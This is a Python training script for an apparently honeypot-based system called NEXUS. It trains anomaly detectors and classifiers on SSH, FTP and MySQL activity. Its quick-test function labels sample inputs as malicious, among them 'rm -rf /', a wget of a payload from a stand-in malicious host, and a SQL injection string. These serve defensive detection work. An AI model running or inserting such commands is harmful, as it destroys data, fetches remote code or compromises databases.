#!/usr/bin/env python3
"""
NEXUS AI Model Training Script
Comprehensive training pipeline for all honeypot services using provided datasets
With extensive debugging, logging, and verbose output for ML operations.
"""

import sys
import logging
import argparse
from pathlib import Path
import json
import time
from typing import Dict, List, Any
import os

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from src.ai.data_processor import DataProcessor
from src.ai.training import ModelTrainer
from src.ai.config import MLConfig
from src.ai.embeddings import EmbeddingManager
from src.ai.ml_logger import MLLogger, get_ml_logger, VerbosityLevel

# Configure file logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('training.log'),
    ]
)


class ComprehensiveTrainer:
    """Comprehensive ML model trainer for all NEXUS services with extensive verbosity"""
    
    def __init__(self, datasets_dir: str = "datasets", verbosity: int = 1):
        self.datasets_dir = Path(datasets_dir)
        self.verbosity = verbosity
        self.ml_logger = get_ml_logger(verbosity)
        
        # Initialize data processor with logger
        self.data_processor = DataProcessor(str(self.datasets_dir))
        self.data_processor.set_verbosity(verbosity)
        
        self.services = ['ssh', 'ftp', 'mysql']
        self.results = {}
        
        # Ensure models directory exists
        models_dir = Path("models")
        models_dir.mkdir(exist_ok=True)
        
        logging.info(f"Initialized trainer with datasets from: {self.datasets_dir}")
        self.ml_logger.log_step(f"Models directory: {models_dir.absolute()}", level="debug")
    
    def train_all_services(self, algorithms: List[str] = None) -> Dict[str, Any]:
        """Train models for all services with detailed progress output"""
        if algorithms is None:
            algorithms = ['isolation_forest', 'one_class_svm', 'hdbscan', 'xgboost']
        
        # Start operation tracking
        self.ml_logger.start_operation("Model Training Pipeline", total_phases=len(self.services) + 1)
        
        logging.info("[START] Starting comprehensive model training for all services...")
        start_time = time.time()
        
        # Phase 1: Initialization
        self.ml_logger.start_phase("Initialization", "Setting up training environment")
        self.ml_logger.log_step(f"Datasets directory: {self.datasets_dir}", level="info")
        self.ml_logger.log_step(f"Services to train: {', '.join(self.services)}", level="info")
        self.ml_logger.log_step(f"Algorithms: {', '.join(algorithms)}", level="info")
        self.ml_logger.end_phase("initialization", success=True)
        
        # Train each service
        for i, service in enumerate(self.services):
            self.ml_logger.start_phase(
                f"Training {service.upper()} Service",
                f"Phase {i+2}/{len(self.services)+1}"
            )
            self.ml_logger.set_service(service)
            
            logging.info(f"\n{'='*60}")
            logging.info(f"[TRAIN] Training models for {service.upper()} service")
            logging.info(f"{'='*60}")
            
            try:
                service_results = self.train_service_models(service, algorithms)
                self.results[service] = service_results
                
                if service_results['success']:
                    self.ml_logger.log_step(
                        f"Successfully trained {service.upper()} - "
                        f"{len(service_results.get('algorithms_trained', []))} algorithms, "
                        f"{service_results.get('training_samples', 0):,} samples",
                        level="success"
                    )
                    logging.info(f"[SUCCESS] Successfully trained {service.upper()} models")
                else:
                    error_msg = service_results.get('error', 'Unknown error')
                    self.ml_logger.log_step(f"Failed to train {service.upper()}: {error_msg}", level="error")
                    logging.error(f"[ERROR] Failed to train {service.upper()} models: {error_msg}")
                    
            except Exception as e:
                self.ml_logger.log_error(f"Critical error training {service}", exception=e)
                logging.error(f"[ERROR] Critical error training {service}: {e}")
                self.results[service] = {'success': False, 'error': str(e)}
                
            self.ml_logger.end_phase(f"{service}_training", success=self.results[service].get('success', False))
        
        total_time = time.time() - start_time
        self.ml_logger.end_operation("Training Pipeline", success=True)
        
        logging.info(f"\n[COMPLETE] Training completed in {total_time:.2f} seconds")
        
        # Generate summary report
        self.generate_training_report()
        
        return self.results
    
    def train_service_models(self, service: str, algorithms: List[str]) -> Dict[str, Any]:
        """Train models for a specific service with detailed step-by-step output"""
        algo_start = time.time()
        
        try:
            # Initialize trainer and config
            self.ml_logger.log_step(f"Initializing ML configuration for {service}...", level="debug")
            config = MLConfig(service)
            trainer = ModelTrainer(service, config)
            trainer.set_verbosity(self.verbosity)
            
            # Get training data
            self.ml_logger.log_step(f"Loading training data for {service}...", level="info")
            logging.info(f"[DATA] Loading training data for {service}...")
            
            data_load_start = time.time()
            data = self.data_processor.get_processed_data(service)
            service_data = data.get(service, [])
            data_load_time = time.time() - data_load_start
            
            if not service_data:
                self.ml_logger.log_warning(f"No training data found for {service}")
                logging.warning(f"[WARNING] No training data found for {service}")
                return {'success': False, 'error': 'No training data available'}
            
            self.ml_logger.log_step(
                f"Loaded {len(service_data):,} samples in {data_load_time:.2f}s",
                level="data"
            )
            logging.info(f"[INFO] Found {len(service_data)} training samples for {service}")
            
            # Display label distribution if verbose
            if self.verbosity >= VerbosityLevel.VERBOSE:
                labels = [item.get('label', 'unknown') for item in service_data]
                self.ml_logger.log_label_distribution(labels, f"{service.upper()} Label Distribution")
            
            # Split data
            self.ml_logger.log_step("Splitting data into train/test sets...", level="debug")
            split_start = time.time()
            train_data, test_data = self.data_processor.get_training_data(service, test_size=0.2)
            split_time = time.time() - split_start
            
            self.ml_logger.log_step(
                f"Data split: {len(train_data):,} training, {len(test_data):,} testing ({split_time:.2f}s)",
                level="data"
            )
            logging.info(f"[SPLIT] Split: {len(train_data)} training, {len(test_data)} testing samples")
            
            results = {}
            
            # Train models based on specified algorithms
            for algorithm in algorithms:
                algo_train_start = self.ml_logger.log_algorithm_start(algorithm, service)
                logging.info(f"[ALGO] Training {algorithm} for {service}...")
                
                try:
                    if algorithm == 'isolation_forest':
                        result = trainer.train_anomaly_detector(train_data, 'isolation_forest')
                    elif algorithm == 'one_class_svm':
                        result = trainer.train_anomaly_detector(train_data, 'one_class_svm')
                    elif algorithm == 'lof':
                        result = trainer.train_anomaly_detector(train_data, 'lof')
                    elif algorithm == 'hdbscan':
                        result = trainer.train_clustering_model(train_data, 'hdbscan')
                    elif algorithm == 'kmeans':
                        result = trainer.train_clustering_model(train_data, 'kmeans')
                    elif algorithm == 'xgboost':
                        # Only train if we have multiple labels
                        labels = [item.get('label', 'normal') for item in train_data]
                        unique_labels = set(labels)
                        if len(unique_labels) > 1:
                            self.ml_logger.log_step(
                                f"Found {len(unique_labels)} unique labels for supervised training",
                                level="debug"
                            )
                            result = trainer.train_supervised_classifier(train_data)
                        else:
                            self.ml_logger.log_step(
                                f"Skipping XGBoost - only {len(unique_labels)} label(s) found",
                                level="warning"
                            )
                            logging.info(f"[SKIP] Skipping XGBoost for {service} - insufficient label diversity")
                            continue
                    else:
                        self.ml_logger.log_warning(f"Unknown algorithm: {algorithm}")
                        logging.warning(f"[WARNING] Unknown algorithm: {algorithm}")
                        continue
                    
                    results[algorithm] = result
                    
                    # Extract and display metrics
                    metrics = {}
                    if 'accuracy' in result:
                        metrics['Accuracy'] = result['accuracy']
                        logging.info(f"[SUCCESS] {algorithm}: Accuracy = {result['accuracy']:.3f}")
                    if 'f1_score' in result:
                        metrics['F1 Score'] = result['f1_score']
                        logging.info(f"   F1 Score = {result['f1_score']:.3f}")
                    if 'precision' in result:
                        metrics['Precision'] = result['precision']
                    if 'recall' in result:
                        metrics['Recall'] = result['recall']
                    if 'n_clusters' in result:
                        metrics['Clusters'] = result['n_clusters']
                        logging.info(f"   Clusters = {result['n_clusters']}")
                    if 'silhouette_score' in result:
                        metrics['Silhouette'] = result['silhouette_score']
                    if 'auc_score' in result:
                        metrics['AUC'] = result['auc_score']
                    
                    self.ml_logger.log_algorithm_end(algorithm, algo_train_start, metrics, success=True)
                    
                except Exception as e:
                    self.ml_logger.log_algorithm_end(algorithm, algo_train_start, success=False)
                    self.ml_logger.log_error(f"Failed to train {algorithm}", exception=e)
                    logging.error(f"[ERROR] Failed to train {algorithm} for {service}: {e}")
                    results[algorithm] = {'error': str(e)}
            
            # Train embedding similarity
            self.ml_logger.log_step("Training embedding similarity model...", level="info")
            logging.info(f"[EMBED] Training embedding similarity for {service}...")
            
            embed_start = time.time()
            try:
                embedding_result = trainer.train_embedding_similarity(train_data)
                results['embeddings'] = embedding_result
                embed_time = time.time() - embed_start
                
                index_size = embedding_result.get('index_size', 0)
                self.ml_logger.log_step(
                    f"Embeddings trained: Index size = {index_size:,} vectors ({embed_time:.2f}s)",
                    level="success"
                )
                logging.info(f"[SUCCESS] Embeddings: Index size = {index_size}")
            except Exception as e:
                self.ml_logger.log_error(f"Failed to train embeddings", exception=e)
                logging.error(f"[ERROR] Failed to train embeddings for {service}: {e}")
                results['embeddings'] = {'error': str(e)}
            
            # Save models
            self.ml_logger.log_step("Saving trained models...", level="info")
            logging.info(f"[SAVE] Saving models for {service}...")
            save_start = time.time()
            trainer.save_models()
            save_time = time.time() - save_start
            self.ml_logger.log_step(f"Models saved ({save_time:.2f}s)", level="success")
            
            # Evaluate on test data if available
            if test_data:
                self.ml_logger.log_step("Evaluating models on test data...", level="info")
                logging.info(f"[EVAL] Evaluating models on test data...")
                evaluation_results = {}
                
                for model_name in trainer.models.keys():
                    try:
                        eval_result = trainer.evaluate_model(model_name, test_data)
                        evaluation_results[model_name] = eval_result
                        
                        if 'accuracy' in eval_result:
                            self.ml_logger.log_step(
                                f"{model_name} test accuracy: {eval_result['accuracy']:.3f}",
                                level="data",
                                indent=2
                            )
                            logging.info(f"[EVAL] {model_name} test accuracy: {eval_result['accuracy']:.3f}")
                            
                    except Exception as e:
                        self.ml_logger.log_step(f"Could not evaluate {model_name}: {e}", level="debug", indent=2)
                        logging.warning(f"[WARNING] Could not evaluate {model_name}: {e}")
                
                results['evaluation'] = evaluation_results
            
            total_algo_time = time.time() - algo_start
            
            return {
                'success': True,
                'training_samples': len(train_data),
                'test_samples': len(test_data),
                'algorithms_trained': list(results.keys()),
                'results': results,
                'training_time': total_algo_time
            }
            
        except Exception as e:
            self.ml_logger.log_error(f"Error training {service}", exception=e)
            logging.error(f"❌ Error training {service}: {e}")
            return {'success': False, 'error': str(e)}
    
    def generate_training_report(self):
        """Generate comprehensive training report with formatted output"""
        report_file = Path("training_report.json")
        
        # Create detailed report
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'datasets_directory': str(self.datasets_dir),
            'services_trained': len([s for s in self.results.values() if s.get('success', False)]),
            'total_services': len(self.services),
            'results': self.results,
            'summary': {}
        }
        
        # Generate summary statistics
        total_samples = 0
        successful_services = 0
        total_algorithms = 0
        total_time = 0
        
        for service, result in self.results.items():
            if result.get('success', False):
                successful_services += 1
                total_samples += result.get('training_samples', 0)
                total_algorithms += len(result.get('algorithms_trained', []))
                total_time += result.get('training_time', 0)
        
        report['summary'] = {
            'successful_services': successful_services,
            'total_training_samples': total_samples,
            'total_algorithms_trained': total_algorithms,
            'success_rate': successful_services / len(self.services) if self.services else 0,
            'total_training_time': total_time
        }
        
        # Save report
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logging.info(f"[REPORT] Training report saved to: {report_file}")
        
        # Print formatted summary using ml_logger
        self.ml_logger.print_summary(self.results, "ML Training Results")
        
        # Additional console output
        print(f"\n📁 Report saved to: {report_file}")
        print(f"📊 Total training time: {total_time:.2f}s")
        print(f"📊 Total samples processed: {total_samples:,}")
    
    def quick_test_models(self):
        """Quick test of trained models with sample data"""
        self.ml_logger.start_phase("Model Testing", "Running quick validation tests")
        logging.info("\n[TEST] Running quick model tests...")
        
        test_cases = {
            'ssh': [
                {'command': 'ls -la', 'label': 'normal'},
                {'command': 'rm -rf /', 'label': 'malicious'},
                {'command': 'wget http://malicious.com/payload.sh', 'label': 'malicious'}
            ],
            'mysql': [
                {'query': 'SELECT * FROM users WHERE id = 1', 'label': 'normal'},
                {'query': "SELECT * FROM users WHERE id = 1' OR 1=1--", 'label': 'malicious'},
                {'query': 'SHOW TABLES', 'label': 'normal'}
            ],
            'ftp': [
                {'command': 'LIST', 'filename': '', 'label': 'normal'},
                {'command': 'RETR', 'filename': 'document.txt', 'label': 'normal'},
                {'command': 'STOR', 'filename': 'malware.exe', 'label': 'malicious'}
            ],
        }
        
        for service in self.services:
            if not self.results.get(service, {}).get('success', False):
                continue
                
            self.ml_logger.log_step(f"Testing {service.upper()} models...", level="info")
            logging.info(f"\n[TEST] Testing {service.upper()} models...")
            
            try:
                from ai.detectors import MLDetector
                config = MLConfig(service)
                detector = MLDetector(service, config)
                
                if not detector.is_trained:
                    self.ml_logger.log_warning(f"No trained models found for {service}")
                    logging.warning(f"[WARNING] No trained models found for {service}")
                    continue
                
                test_data = test_cases.get(service, [])
                for i, test_case in enumerate(test_data):
                    try:
                        result = detector.score(test_case)
                        anomaly_score = result.get('ml_anomaly_score', 0)
                        labels = result.get('ml_labels', [])
                        
                        expected = test_case.get('label', 'unknown')
                        is_correct = (anomaly_score < 0.5 and expected == 'normal') or \
                                    (anomaly_score >= 0.5 and expected == 'malicious')
                        
                        status = "success" if is_correct else "error"
                        self.ml_logger.log_step(
                            f"Test {i+1}: Score={anomaly_score:.3f}, Expected={expected}, Correct={is_correct}",
                            level=status,
                            indent=2
                        )
                        logging.info(f"  {'🟢' if is_correct else '🔴'} Test {i+1}: Score={anomaly_score:.3f}, Labels={labels}, Expected={expected}")
                        
                    except Exception as e:
                        self.ml_logger.log_error(f"Test {i+1} failed", exception=e)
                        logging.error(f"❌ Test {i+1} failed: {e}")
                        
            except Exception as e:
                self.ml_logger.log_error(f"Could not test {service} models", exception=e)
                logging.error(f"❌ Could not test {service} models: {e}")
                
        self.ml_logger.end_phase("model_testing", success=True)


def main():
    parser = argparse.ArgumentParser(
        description='NEXUS AI Model Training Pipeline',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Verbosity Levels:
  0 (MINIMAL)  - Only errors and final results
  1 (NORMAL)   - Standard progress updates (default)
  2 (VERBOSE)  - Detailed operation info with data statistics
  3 (DEBUG)    - Full debugging output with stack traces

Examples:
  python train_service-ml.py --services ssh --algorithms isolation_forest
  python train_service-ml.py --services all --algorithms all --verbose-level 3
  python train_service-ml.py --services mysql ftp --algorithms xgboost hdbscan -v
        """
    )
    parser.add_argument('--datasets-dir', default='datasets', help='Datasets directory path')
    parser.add_argument('--services', nargs='+', choices=['ssh', 'ftp', 'mysql', 'all'], 
                       default=['all'], help='Services to train models for')
    parser.add_argument('--algorithms', nargs='+', 
                       choices=['isolation_forest', 'one_class_svm', 'lof', 'hdbscan', 'kmeans', 'xgboost', 'all'],
                       default=['all'], help='ML algorithms to train')
    parser.add_argument('--test', action='store_true', help='Run quick model tests after training')
    parser.add_argument('--verbose', '-v', action='count', default=0, 
                       help='Increase verbosity (use -v, -vv, or -vvv)')
    parser.add_argument('--verbose-level', type=int, choices=[0, 1, 2, 3], default=None,
                       help='Set specific verbosity level (0-3)')
    
    args = parser.parse_args()
    
    # Determine verbosity level
    if args.verbose_level is not None:
        verbosity = args.verbose_level
    else:
        verbosity = min(args.verbose + 1, 3)  # -v gives level 2, -vv gives level 3
    
    # Configure logging level based on verbosity
    if verbosity >= 3:
        logging.getLogger().setLevel(logging.DEBUG)
    elif verbosity >= 2:
        logging.getLogger().setLevel(logging.INFO)
    else:
        logging.getLogger().setLevel(logging.WARNING)
    
    # Resolve services
    if 'all' in args.services:
        services = ['ssh', 'ftp', 'mysql']
    else:
        services = args.services
    
    # Resolve algorithms
    if 'all' in args.algorithms:
        algorithms = ['isolation_forest', 'one_class_svm', 'hdbscan', 'xgboost']
    else:
        algorithms = args.algorithms
    
    # Initialize logger and trainer
    ml_logger = get_ml_logger(verbosity)
    
    # Print startup banner
    ml_logger.print_banner("NEXUS AI Model Training Pipeline", {
        'Datasets': args.datasets_dir,
        'Services': ', '.join(services),
        'Algorithms': ', '.join(algorithms),
        'Models Output': 'models/'
    })
    
    # Initialize trainer
    trainer = ComprehensiveTrainer(args.datasets_dir, verbosity)
    trainer.services = services  # Override with selected services
    
    try:
        # Train models
        results = trainer.train_all_services(algorithms)
        
        # Run tests if requested
        if args.test:
            trainer.quick_test_models()
        
        # Check overall success
        successful_services = sum(1 for r in results.values() if r.get('success', False))
        total_services = len(services)
        
        if successful_services == total_services:
            ml_logger.log_step(f"All {total_services} services trained successfully!", level="success")
            return 0
        elif successful_services > 0:
            ml_logger.log_warning(f"{successful_services}/{total_services} services trained successfully")
            return 1
        else:
            ml_logger.log_error("No services were trained successfully")
            return 2
            
    except KeyboardInterrupt:
        ml_logger.log_warning("Training interrupted by user")
        print("\n[INTERRUPT] Training interrupted by user")
        return 130
    except Exception as e:
        ml_logger.log_error("Critical error occurred", exception=e)
        logging.error(f"[ERROR] Critical error: {e}")
        return 1

if __name__ == '__main__':
    sys.exit(main())
